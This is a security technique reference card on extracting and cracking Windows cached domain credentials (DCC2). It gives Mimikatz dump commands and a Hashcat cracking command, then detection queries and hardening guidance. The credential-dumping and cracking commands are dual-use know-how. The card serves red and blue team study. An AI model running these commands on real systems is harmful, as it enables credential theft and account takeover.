# [CA-DUMP-004]: Cached Domain Credentials Extraction

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-DUMP-004 |
| **MITRE ATT&CK v18.1** | [OS Credential Dumping: Cached Domain Credentials (T1003.005)](https://attack.mitre.org/techniques/T1003/005/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows Endpoint |
| **Severity** | **Medium** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Windows caches the hash (MSCache v2 / DCC2) of the last logged-in domain users to allow login when the Domain Controller is unavailable. Attackers can extract these hashes and attempt to crack them offline.
- **Attack Surface:** The `HKLM\SECURITY\Cache` registry key.
- **Business Impact:** **Offline Cracking**. Unlike NTLM hashes, cached credentials cannot be used for Pass-the-Hash, but if cracked, they reveal the plaintext password.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** SYSTEM.
- **Vulnerable Config:** `CachedLogonsCount` > 0 (Default is 10).
- **Tools:**
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
    - [Hashcat](https://hashcat.net/hashcat/)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Extraction**
Use Mimikatz to dump the cached credentials from the registry.
```powershell
token::elevate
lsadump::cache
```
*Output will be in the format: `User:Hash` (DCC2).*

**Step 2: Cracking (Offline)**
Use Hashcat (Mode 2100) to crack the DCC2 hash.
```bash
hashcat -m 2100 -a 0 extracted_dcc2.txt rockyou.txt
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4663 | Access to `HKLM\SECURITY\Cache`. |

#### 5.2 Sentinel (KQL)
```kusto
// Focus on processes accessing the specific registry key
RegistryEvent
| where TargetObject has "SECURITY\\Cache"
| where AccessMask == "0x1" // Query Value
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Configuration:** Set `Interactive logon: Number of previous logons to cache` (in GPO) to **0** for high-security workstations. *Note: This prevents login if the DC is unreachable (e.g., laptops off-network).*
*   **Hygiene:** Do not allow Domain Admins to log in to workstations, preventing their high-value hash from being cached.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-VALID-001]
> **Next Logical Step:** [LAT-AD-001] (Login with cracked password)
